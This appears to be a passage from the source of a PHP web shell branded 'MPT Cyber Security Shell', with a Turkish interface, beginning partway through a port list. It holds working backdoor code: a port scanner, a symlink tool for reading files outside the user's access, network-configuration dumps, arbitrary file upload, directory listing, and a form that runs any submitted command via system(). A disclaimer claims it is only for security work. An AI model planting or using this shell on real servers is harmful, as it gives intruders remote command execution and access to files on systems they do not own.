,9877 ,9878 ,9898 ,9900 ,9917 ,9929 ,9943 ,9944 ,9968 ,9998 ,9999 ,10000 ,10001 ,10002 ,10003 ,10004 ,10009 ,10010 ,10012 ,10024 ,10025 ,10082 ,10180 ,10215 ,10243 ,10566 ,10616 ,10617 ,10621 ,10626 ,10628 ,10629 ,10778 ,11110 ,11111 ,11967 ,12000 ,12174 ,12265 ,12345 ,13456 ,13722 ,13782 ,13783 ,14000 ,14238 ,14441 ,14442 ,15000 ,15002 ,15003 ,15004 ,15660 ,15742 ,16000 ,16001 ,16012 ,16016 ,16018 ,16080 ,16113 ,16992 ,16993 ,17877 ,17988 ,18040 ,18101 ,18988 ,19101 ,19283 ,19315 ,19350 ,19780 ,19801 ,19842 ,20000 ,20005 ,20031 ,20221 ,20222 ,20828 ,21571 ,22939 ,23502 ,24444 ,24800 ,25734 ,25735 ,26214 ,27000 ,27352 ,27353 ,27355 ,27356 ,27715 ,28201 ,30000 ,30718 ,30951 ,31038 ,31337 ,32768 ,32769 ,32770 ,32771 ,32772 ,32773 ,32774 ,32775 ,32776 ,32777 ,32778 ,32779 ,32780 ,32781 ,32782 ,32783 ,32784 ,32785 ,33354 ,33899 ,34571 ,34572 ,34573 ,35500 ,38292 ,40193 ,40911 ,41511 ,42510 ,44176 ,44442 ,44443 ,44501 ,45100 ,48080 ,49152 ,49153 ,49154 ,49155 ,49156 ,49157 ,49158 ,49159 ,49160 ,49161 ,49163 ,49165 ,49167 ,49175 ,49176 ,49400 ,49999 ,50000 ,50001 ,50002 ,50003 ,50006 ,50300 ,50389 ,50500 ,50636 ,50800 ,51103 ,51493 ,52673 ,52822 ,52848 ,52869 ,54045 ,54328 ,55055 ,55056 ,55555 ,55600 ,56737 ,56738 ,57294 ,57797 ,58080 ,60020 ,60443 ,61532 ,61900 ,62078 ,63331 ,64623 ,64680 ,65000 ,65129 ,65389);
							?>
							<textarea style="width:500px;height:400px">
							<?php
					foreach ($ports as $port)
					{									
						$connection = @fsockopen($host_ismi, $port, $errno, $errstr, 2);
						if (is_resource($connection))
						{
							echo  $host_ismi . ':' . $port . ' ' . '(' . getservbyport($port, 'tcp') . ') portu açık.' . "\n";
							fclose($connection);
						}
						else
						{
							echo  $host_ismi . ':' . $port . ' cevap yok büyük ihtimal kapalı.' . "\n";
						}
					}									
								}
								?>
								</textarea>
							</div>
						</center>
						<?php
					}
					?>
					<center>
					<?php
					if(isset($_GET['symlink'])){
						?>
						<div class="symlink">
						<form action="" method="post">
							<b style="font-family:verdana;font-size:15px;background-color:#a3b2c1">Symlink( Symbolic Link) sistem üzerinde bir dizinde ki dosya veya klasöre ait sembolik linklemesini oluşturur. Bu şekilde erişiminizin olmadığı dizinlerde ki dosyaları, erişiminize açık dizinlere linkleyerek okunabilirliğini sağlayabilirsiniz.
							</b><br><br>
							<b style="font-family:verdana;font-size:14px;color:#D25400">Dosya Yolu:</b> <input type="textbox" name="dosyayolu" placeholder="Ör: /home/kullanici/public_html/dosya.php" style="width:461px">
							<br><br>
							<b style="font-family:verdana;font-size:14px;color:#D25400">Yeni Yolu:&nbsp;&nbsp;&nbsp;</b><input type="textbox" name="yenidosyayolu" placeholder="Ör: /home/ben/public_html/dosya.txt" style="width:461px">
							<br><br>
							<input type="submit" value="Symlink" name="sym_buton" style="background-color:#34495E;font-family:15px;color:white">
							</form>
						
						
					<?php	
						if(isset($_POST['sym_buton'])){
							if(empty($_POST['dosyayolu']) || empty($_POST['yenidosyayolu'] )){
							echo "Boş değer göndermemelisin.";}else{
							$yolu = $_POST['dosyayolu'];
							$yeni_yolu = $_POST['yenidosyayolu'];
							symlink($yolu,$yeni_yolu);
							
							?><br>
						<b><a href="<?php echo $yeni_yolu;?>" target="_blank" style="color:black;font-family:verdana;font-size:14px">Bi' bak bakim <?php echo $yeni_yolu;?></a></b>
							<?php
						}
							
						}
					}
					
					?>
					</div>
					</center>
				<?php
				if(isset($_GET['ag'])){
					?>
					<center>
						<div class="ag">
						
							<textarea name="ag_cikti" style="width:831px;height:611px;background-color:black;color:white">
								<?php
								$cikti_ag = system('ifconfig');
								$cikti_ag = system('ipconfig /all');
								?>
							</textarea>
						</div>
					</center>
					<?php
				}
				?>
				<?php
				if(isset($_GET['upload'])){
					?>
					<center>
						<div class="yukle">
						<form enctype="multipart/form-data" action="" method="POST">
							<p></p>
							<b style="font-size:15px;font-family:verdana;color:#D25400">Dizin:</b> <input type="textbox" name="hangi_dizin" placeholder="/home/user/public_html/upload/" style="width:340px"><br><br>
							<input type="file" name="up" style="background-color:#34495E;color:white"></input><br /><br>
							<input type="submit" value="Yükle" style="background-color:#34495E;color:white">
						  </form>
						  <?php
						  if(!empty($_FILES['up']))
						  {
							$path = $_POST['hangi_dizin'];
							$path = $path . basename($_FILES['up']['name']);
							if(move_uploaded_file($_FILES['up']['tmp_name'], $path)) {
							  echo "Dizine ".  $path. 
							  " yüklendi.";
							} else{
								echo "Yükleme Başarısız!";
							}
						  }
						  ?>
						</div>
					</center>
					<?php
				}
				?>
				<?php
				if(isset($_GET['dosyalar'])){
					
					?>
					<center>
						<div class="hangi_dosyalar">
						<form action="" method="post">
							<b style="font-size:15px;font-family:verdana;color:#D25400">Dizin:</b> <input type="textbox" name="hangi_dizin" placeholder="/home/user/public_html/ VEYA C:/inetpub/wwwroot/" style="background-color:#34495E;color:white;width:840px;"><br>
							<input type="submit" value="[  Dosyaları Göster  ]" name="dosya_goster" style="background-color:#34495E;color:white;width:161px;margin-top:5px"><br><br>
						</form>
							
							<?php
							if(isset($_POST['dosya_goster'])){
								
							?>
							<textarea style="width:980px;height:530px;background-color:black;color:white">
							<?php 
							$hangisi=$_POST['hangi_dizin'];
							
							$files1 = scandir($hangisi,1);
							
							$sayisi = count($files1);
							for($i=0;$i<$sayisi;$i++){
							echo "\n[ ".$files1[$i]." ] \n ";
							}
							?>
							</textarea>
							<?php
							} 
							?>
						</div>
					</center>
					<?php
				}
				?>
				<?php
				if(isset($_GET['info'])){
					?>
					<center>
					
					<div class="hakkinda">
					<label>--------------------------------------------------<br>
!!! Önemli Uyarı !!! <br>
Bu dosyanın, "siber güvenlik (güvenlik!) çerçevesi dışında suç teşkil edecek davranış ve/veya faaliyetlerde kullanılmasından" bu dosyayı  geliştiren kişi sorumlu değildir!. <br>
Bu dosya yanlızca siber güvenlik çerçevesinde kullanılması amacıyla geliştirilmiştir. Bir suç veya suç teşkil eden olaylarda, faaliyetlerde kullanılması için geliştirilmemiştir.<br> Bu dosyayı kullanan şahıs, şahıslar, gruplar veya topluluklar, bunu dikkate alarak kullanmalıdırlar. <br>Ayrıca bu dosyanın orjinal halinin, dosyayı kullanan kişi/kişiler, gruplar veya topluluklar tarafından değiştirilerek, tahrif edilerek, bozularak veya kırpılarak, yasal uyarı kısmı olan bu metinlerin tahrif olmasından, silinmesinden geliştirici kişi sorumlu değildir.!<br>
Bu dosya, kaynak kodları açık halde 05.07.2019 (5 Temmuz 2019) tarihinde Github.com üzerinden yayınlanmıştır.<br>
Bu dosyanın kullanılması halinde kullananların, '!!! Önemli Uyarı  !!!'  başlığı altında geçen ve belirtilen tüm bu sorumlulukları kendi üzerine aldığı/aldıkları kabul edilir.<br>
--------------------------------------------------
</label>
					</div>
					</center>
					<?php
				}
				?>
				</div>
				
	
	
	<?php }?>
	<style>
	
	</style>
	<div class="anasayfa_altlari">
					<div class="komut_seyi">
					<center>
				<form action="" method="post">
					<font color="wheat" face="verdana" style="font-size:16px;">Komut Çalıştır: </font>
					<input type="textbox" name="komut_bu" class="komut_bu" placeholder="Komut" style="padding-left:5px;margin-top:1px;width:600px;height:27px;font-size:16px;font-family:verdana;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="Çalıştır" name="kcalistir" style="width:121px;margin-top:2px;height:27px;background-color:wheat;color:#5E5E5E;font-size:16px;font-family:verdana;"><br>
					<br>					
				</form>
				<?php
				if(isset($_POST['kcalistir'])){
					$komut_su = $_POST['komut_bu'];
					?>
					<textarea cols="120" rows="20"><?php system($komut_su);?></textarea>
					<?php
				}
				?>
				
					</center>
					</div>
	</div>

</body>
</html>
<center>MPT Cyber Security Shell  - V1</center>
